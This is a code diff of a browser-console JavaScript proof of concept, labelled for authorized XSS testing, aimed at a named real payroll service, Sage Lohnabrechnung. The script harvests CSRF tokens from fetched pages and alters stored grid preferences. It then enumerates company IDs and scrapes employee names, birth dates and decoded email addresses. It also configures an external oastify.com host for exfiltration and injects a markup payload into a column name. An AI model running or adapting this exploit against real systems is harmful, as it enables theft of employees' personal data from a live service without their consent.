@@ -1,11 +1,10 @@
 /**
  * Sage Lohnabrechnung — XSS impact PoC (authorized testing only)
  *
- * Run in DevTools Console while logged in on:
- *   https://lohnabrechnung.sage.com/companies/414079/employees
+ * Run in DevTools Console while logged in on lohnabrechnung.sage.com (any page).
  *
  * Flow:
- *   1. Read CSRF from #new_SopEmployee form (HttpOnly cookie not needed in JS)
+ *   1. Fetch /companies → parse _csrfToken from HTML (HttpOnly cookie not readable in JS)
  *   2. POST + PUT /settings/preferences/store → show EMail column
  *   3. Fetch /companies → enumerate company IDs
  *   4. Fetch each /companies/{id}/employees → parse grid + decode CF emails
@@ -14,11 +13,11 @@
 (async function lohnabrechnungEmployeeExtractPoC() {
   'use strict';
 
-  const BASE = 'https://lohnabrechnung.sage.com'; // 
+  const BASE = location.origin; // https://lohnabrechnung.sage.com
   const OAST_HOST = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com'; // set '' to skip exfil
   const GRID_COLUMNS = [
     'EmployeeNumber',
-    'FirstName', // XSS demo column — use 'FirstName' if you only want email display
+    'FirstName<img>', // XSS demo column — use 'FirstName' if you only want email display
     'LastName',
     'BirthDate',
     'Entry',
@@ -90,19 +89,70 @@
     return ta.value.replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim();
   }
 
-  // ---------- CSRF from form (not HttpOnly cookie) ----------
-  function getCsrfToken() {
+  // ---------- CSRF from fetched HTML (HttpOnly SEC[csrfToken] cookie is not readable) ----------
+  function parseCsrfFromHtml(html) {
+    if (!html) return null;
+
+    const doc = new DOMParser().parseFromString(html, 'text/html');
     const input =
+      doc.querySelector('input[name="_csrfToken"]') ||
+      doc.querySelector('input[name="csrfToken"]');
+    if (input?.value) return input.value;
+
+    const patterns = [
+      /name="_csrfToken"\s+value="([^"]+)"/i,
+      /name='_csrfToken'\s+value='([^']+)'/i,
+      /name="csrfToken"\s+value="([^"]+)"/i,
+      /"csrfToken"\s*:\s*"([^"]+)"/i,
+      /csrf-token"\s+content="([^"]+)"/i,
+    ];
+    for (const re of patterns) {
+      const m = html.match(re);
+      if (m?.[1]) return m[1];
+    }
+    return null;
+  }
+
+  /** Prefer live DOM, then fetch https://lohnabrechnung.sage.com/companies */
+  async function getCsrfToken() {
+    const live =
       document.querySelector('#new_SopEmployee input[name="_csrfToken"]') ||
       document.querySelector('form input[name="_csrfToken"]') ||
       document.querySelector('input[name="_csrfToken"]');
-    if (input?.value) return input.value;
+    if (live?.value) {
+      console.log('🔑 CSRF source: current page DOM');
+      return live.value;
+    }
 
-    const html = document.documentElement.innerHTML;
-    const m = html.match(/name="_csrfToken"\s+value="([^"]+)"/i);
-    if (m) return m[1];
+    const fromCurrentPage = parseCsrfFromHtml(document.documentElement.innerHTML);
+    if (fromCurrentPage) {
+      console.log('🔑 CSRF source: current page HTML');
+      return fromCurrentPage;
+    }
 
-    throw new Error('CSRF not found — open /companies/{id}/employees first');
+    console.log('🔑 CSRF source: fetching /companies ...');
+    const resp = await fetch(`${BASE}/companies`, {
+      credentials: 'include',
+      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
+    });
+    if (!resp.ok) {
+      throw new Error(`Cannot fetch /companies for CSRF: HTTP ${resp.status}`);
+    }
+    const html = await resp.text();
+    const token = parseCsrfFromHtml(html);
+    if (!token) {
+      throw new Error('CSRF not found in /companies HTML — session expired?');
+    }
+    return token;
+  }
+
+  async function fetchCompaniesPage() {
+    const resp = await fetch(`${BASE}/companies`, {
+      credentials: 'include',
+      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
+    });
+    if (!resp.ok) throw new Error(`/companies HTTP ${resp.status}`);
+    return resp.text();
   }
 
   // ---------- Update grid preferences (POST + PUT) ----------
@@ -236,17 +286,16 @@
   try {
     console.log('🚀 start — base:', BASE);
 
-    const csrf = getCsrfToken();
-    console.log('🔑 CSRF from form:', csrf.slice(0, 8) + '...');
+    const companiesHtml = await fetchCompaniesPage();
+    const csrf = parseCsrfFromHtml(companiesHtml) || (await getCsrfToken());
+    console.log('🔑 CSRF:', csrf.slice(0, 8) + '...');
 
     await storeGridPreferences(csrf);
 
     // small delay so server persists prefs
     await new Promise((r) => setTimeout(r, 500));
 
-    const companiesResp = await fetch(`${BASE}/companies`, { credentials: 'include' });
-    if (!companiesResp.ok) throw new Error(`/companies HTTP ${companiesResp.status}`);
-    const companyIds = extractCompanyIds(await companiesResp.text());
+    const companyIds = extractCompanyIds(companiesHtml);
     console.log('🏢 companies:', companyIds);
 
     let all = [];
